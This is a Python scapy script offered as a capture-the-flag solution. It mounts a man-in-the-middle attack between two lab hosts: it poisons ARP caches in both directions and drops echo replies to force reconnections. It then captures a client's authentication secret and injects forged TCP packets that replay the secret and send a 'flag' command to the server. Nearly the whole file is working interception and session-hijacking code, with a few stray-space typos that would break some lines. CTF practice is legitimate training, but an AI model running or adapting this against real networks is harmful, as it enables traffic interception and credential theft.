#!/usr/bin/env python3
"""
CTF MITM Solution - Force Connection Reset Attack
Blocks echo responses to force client reconnection and capture secrets
"""

from scapy.all import *
import threading
import time
import sys
import os
import signal

# ============================================================================
# CONFIGURATION
# ============================================================================

CLIENT_IP = "10.0.0.2"
SERVER_IP = "10.0.0.3"
INTERFACE = None

# Global state
client_mac = None
server_mac = None
attacker_mac = None
attacker_ip = None
secret_captured = None
poisoning_active = True

# Statistics
connection_resets = 0
injected_responses = set()
hello_world_blocked = 0

# ============================================================================
# LOGGING
# ============================================================================

class Colors:
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    MAGENTA = '\033[95m'
    END = '\033[0m'
    BOLD = '\033[1m'

def log(msg, color=None):
    timestamp = time.strftime("%H:%M:%S")
    if color:
        print(f"{color}[{timestamp}] {msg}{Colors.END}", flush=True)
    else:
        print(f"[{timestamp}] {msg}", flush=True)

def log_info(msg):
    log(f"ℹ️  {msg}", Colors.CYAN)

def log_success(msg):
    log(f"✅ {msg}", Colors.GREEN)

def log_warning(msg):
    log(f"⚠️  {msg}", Colors.YELLOW)

def log_error(msg):
    log(f"❌ {msg}", Colors.RED)

def log_critical(msg):
    log(f"🔑 {msg}", Colors. BOLD + Colors.GREEN)

def log_flag(msg):
    log(f"🏁 {msg}", Colors.BOLD + Colors.YELLOW)

def log_attack(msg):
    log(f"💥 {msg}", Colors.MAGENTA)

# ============================================================================
# NETWORK INITIALIZATION
# ============================================================================

def get_interface():
    global INTERFACE
    try:
        result = conf.route. route(SERVER_IP)
        if result:
            INTERFACE = result[0]
            log_success(f"Auto-detected interface: {INTERFACE}")
            return INTERFACE
    except:
        pass
    INTERFACE = conf.iface
    log_warning(f"Using default interface: {INTERFACE}")
    return INTERFACE

def get_mac(ip, retries=3):
    for attempt in range(retries):
        try:
            ans, _ = srp(
                Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
                timeout=3,
                verbose=0,
                iface=INTERFACE
            )
            if ans: 
                mac = ans[0][1].hwsrc
                log_success(f"Resolved {ip} -> {mac}")
                return mac
        except Exception as e:
            if attempt == retries - 1:
                log_error(f"MAC resolution failed:  {e}")
            time.sleep(1)
    return None

def initialize_network():
    global client_mac, server_mac, attacker_mac, attacker_ip, INTERFACE
    
    log_info("=" * 70)
    log_info("NETWORK INITIALIZATION")
    log_info("=" * 70)
    
    get_interface()
    
    try:
        attacker_mac = get_if_hwaddr(INTERFACE)
        attacker_ip = get_if_addr(INTERFACE)
        log_success(f"Attacker MAC: {attacker_mac}")
        log_success(f"Attacker IP:   {attacker_ip}")
    except Exception as e:
        log_error(f"Failed to get interface info: {e}")
        sys.exit(1)
    
    client_mac = get_mac(CLIENT_IP)
    if not client_mac:
        log_error(f"Cannot resolve client {CLIENT_IP}")
        sys.exit(1)
    
    server_mac = get_mac(SERVER_IP)
    if not server_mac:
        log_error(f"Cannot resolve server {SERVER_IP}")
        sys.exit(1)
    
    log_success("Network initialization complete!")
    log_info("=" * 70)
    return True

# ============================================================================
# ARP SPOOFING
# ============================================================================

def send_arp_spoof(target_ip, target_mac, spoof_ip):
    arp_response = Ether(dst=target_mac, src=attacker_mac) / ARP(
        op=2,
        psrc=spoof_ip,
        hwsrc=attacker_mac,
        pdst=target_ip,
        hwdst=target_mac
    )
    sendp(arp_response, iface=INTERFACE, verbose=0)

def arp_poison_thread():
    log_info("Starting ARP poisoning...")
    count = 0
    while poisoning_active:
        send_arp_spoof(CLIENT_IP, client_mac, SERVER_IP)
        send_arp_spoof(SERVER_IP, server_mac, CLIENT_IP)
        count += 1
        if count % 15 == 0:
            log_info(f"ARP poisoning active ({count} cycles)")
        time.sleep(2)
    log_info("ARP poisoning stopped")

def restore_arp():
    log_info("Restoring ARP tables...")
    restore_client = Ether(dst=client_mac, src=server_mac) / ARP(
        op=2, psrc=SERVER_IP, hwsrc=server_mac, pdst=CLIENT_IP, hwdst=client_mac
    )
    restore_server = Ether(dst=server_mac, src=client_mac) / ARP(
        op=2, psrc=CLIENT_IP, hwsrc=client_mac, pdst=SERVER_IP, hwdst=server_mac
    )
    for i in range(5):
        sendp(restore_client, iface=INTERFACE, verbose=0)
        sendp(restore_server, iface=INTERFACE, verbose=0)
        time.sleep(0.5)
    log_success("ARP tables restored")

# ============================================================================
# PACKET HANDLING
# ============================================================================

def extract_payload(packet):
    if packet.haslayer(Raw):
        return bytes(packet[Raw].load)
    return None

def forward_packet(packet, dst_mac):
    new_packet = Ether(src=attacker_mac, dst=dst_mac) / packet[IP]
    sendp(new_packet, iface=INTERFACE, verbose=0)

def inject_response(server_packet, response_payload):
    """Inject response from 'client' to server."""
    server_tcp = server_packet[TCP]
    server_payload_len = len(server_packet[Raw].load) if server_packet. haslayer(Raw) else 0
    
    ip_layer = IP(src=CLIENT_IP, dst=SERVER_IP)
    tcp_layer = TCP(
        sport=server_tcp. dport,
        dport=server_tcp.sport,
        flags='PA',
        seq=server_tcp.ack,
        ack=server_tcp.seq + server_payload_len
    )
    
    response_packet = Ether(src=attacker_mac, dst=server_mac) / ip_layer / tcp_layer / Raw(load=response_payload)
    sendp(response_packet, iface=INTERFACE, verbose=0)
    
    response_display = response_payload[: 64].decode('utf-8', errors='ignore')
    log_success(f"💉 INJECTED: {repr(response_display)}")

def handle_packet(packet):
    global secret_captured, connection_resets, hello_world_blocked
    
    if not packet.haslayer(IP):
        return
    
    src_ip = packet[IP].src
    dst_ip = packet[IP].dst
    
    if not ((src_ip == CLIENT_IP and dst_ip == SERVER_IP) or 
            (src_ip == SERVER_IP and dst_ip == CLIENT_IP)):
        return
    
    from_client = (src_ip == CLIENT_IP)
    from_server = (src_ip == SERVER_IP)
    
    payload = extract_payload(packet)
    
    if payload and packet.haslayer(TCP):
        try:
            payload_str = payload.decode('utf-8', errors='ignore')
        except: 
            payload_str = payload. hex()
        
        # ====================================================================
        # KEY STRATEGY: Block "Hello, World!" to break the echo loop
        # ====================================================================
        if from_server and payload_str. strip() == "Hello, World!":
            hello_world_blocked += 1
            if hello_world_blocked <= 3:
                log_attack(f"🛑 BLOCKING 'Hello, World!' #{hello_world_blocked}")
                log_attack("   Breaking client assertion to force reconnection!")
            elif hello_world_blocked % 10 == 0:
                log_attack(f"🛑 Blocked {hello_world_blocked} packets total")
            return  # DON'T FORWARD - This breaks the client! 
        
        # Filter noise from logs
        if payload_str. strip() in ["Hello, World!", "echo"]:
            return
        
        direction = "C→S" if from_client else "S→C"
        log_info(f"{direction}:  {repr(payload_str[: 80])}")
        
        # ====================================================================
        # CAPTURE SECRET FROM CLIENT
        # ====================================================================
        if from_client: 
            clean_payload = payload_str.strip()
            # Look for 64-character hex string (32 bytes encoded)
            if (len(clean_payload) == 64 and 
                all(c in '0123456789abcdefABCDEF' for c in clean_payload)):
                
                if not secret_captured or secret_captured != clean_payload:
                    secret_captured = clean_payload
                    connection_resets += 1
                    log_critical("=" * 70)
                    log_critical(f"🔑 SECRET CAPTURED (Connection #{connection_resets})")
                    log_critical(f"   {secret_captured}")
                    log_critical("=" * 70)
        
        # ====================================================================
        # HANDLE SERVER CHALLENGES
        # ====================================================================
        if from_server: 
            packet_id = (packet[TCP].seq, packet[TCP]. ack)
            
            # Server requesting secret
            if "secret:  " in payload_str:
                log_critical("🎯 SERVER CHALLENGE: 'secret:  '")
                
                if secret_captured and packet_id not in injected_responses:
                    time.sleep(0.3)
                    inject_response(packet, secret_captured. encode())
                    injected_responses.add(packet_id)
                    log_warning("⛔ Dropping challenge (client won't see it)")
                    return  # Don't forward
                elif not secret_captured:
                    log_warning("⏳ Secret not captured yet, forwarding normally...")
            
            # Server requesting command
            elif "command: " in payload_str:
                log_critical("🎯 SERVER CHALLENGE: 'command: '")
                
                if packet_id not in injected_responses:
                    time.sleep(0.3)
                    inject_response(packet, b'flag')
                    injected_responses.add(packet_id)
                    log_success("✨ Sent 'flag' command to retrieve the flag!")
                    log_warning("⛔ Dropping challenge (client won't see it)")
                    return  # Don't forward
            
            # Check for flag in response
            elif any(kw in payload_str.lower() for kw in ['pwn.college', 'pwn{', 'flag{', 'ctf{']):
                log_flag("=" * 70)
                log_flag("🏁 🏁 🏁  FLAG RECEIVED!  🏁 🏁 🏁")
                log_flag("=" * 70)
                print(f"\n{payload_str}\n")
                log_flag("=" * 70)
                log_flag(f"Total connection resets forced: {connection_resets}")
                log_flag(f"'Hello, World!' packets blocked: {hello_world_blocked}")
                log_flag("=" * 70)
    
    # Forward all other packets normally
    if from_client:
        forward_packet(packet, server_mac)
    elif from_server:
        forward_packet(packet, client_mac)

def sniff_packets():
    log_info("Starting packet sniffer...")
    log_info(f"Monitoring:  {CLIENT_IP} ↔ {SERVER_IP}")
    bpf_filter = f"host {CLIENT_IP} and host {SERVER_IP}"
    
    try:
        sniff(iface=INTERFACE, prn=handle_packet, filter=bpf_filter, store=0)
    except Exception as e:
        log_error(f"Sniffing error: {e}")

# ============================================================================
# MAIN
# ============================================================================

def signal_handler(sig, frame):
    log_warning("\nCtrl+C detected. Cleaning up...")
    cleanup()
    sys.exit(0)

def cleanup():
    global poisoning_active
    log_info("Performing cleanup...")
    poisoning_active = False
    time.sleep(1)
    restore_arp()
    log_success("Cleanup complete")

def print_banner():
    banner = f"""
{Colors.BOLD}{Colors.MAGENTA}╔══════════════════════════════════════════════════════════════════╗
║          CTF MITM - CONNECTION RESET ATTACK                      ║
╚══════════════════════════════════════════════════════════════════╝{Colors.END}

{Colors. CYAN}Target:  {CLIENT_IP} ↔ {SERVER_IP}{Colors.END}

{Colors. YELLOW}Attack Strategy:{Colors.END}
  1. Poison ARP caches (bidirectional)
  2. {Colors.BOLD}Block "Hello, World!" responses{Colors.END} to break client's echo assertion
  3. Client reconnects when assertion fails
  4. Capture new secret from fresh connection
  5. Intercept "secret: " challenge and inject captured secret
  6. Intercept "command: " challenge and inject "flag"
  7. Receive and display the flag!  🏁

{Colors.RED}Why this works:{Colors.END}
  The client expects:  assert recv() == b"Hello, World!"
  We block the response → assertion fails → connection closes
  → Client reconnects → New authentication cycle begins! 

"""
    print(banner)

def main():
    global poisoning_active
    
    if os.geteuid() != 0:
        log_error("Must run as root!")
        sys.exit(1)
    
    signal.signal(signal.SIGINT, signal_handler)
    print_banner()
    
    try:
        if not initialize_network():
            sys.exit(1)
        
        # Start ARP poisoning
        poison_thread = threading.Thread(target=arp_poison_thread, daemon=True)
        poison_thread.start()
        
        log_info("Waiting for ARP poisoning to take effect...")
        for i in range(3, 0, -1):
            log_info(f"Starting in {i}...")
            time.sleep(1)
        
        log_success("🚀 MITM active!  Forcing connection resets...")
        log_attack("💥 Will block 'Hello, World!' to trigger reconnections")
        log_info("Press Ctrl+C to stop")
        log_info("=" * 70)
        
        sniff_packets()
        
    except KeyboardInterrupt:
        log_warning("\nInterrupted by user")
    except Exception as e:
        log_error(f"Fatal error:  {e}")
        import traceback
        traceback.print_exc()
    finally:
        cleanup()

if __name__ == "__main__":
    main()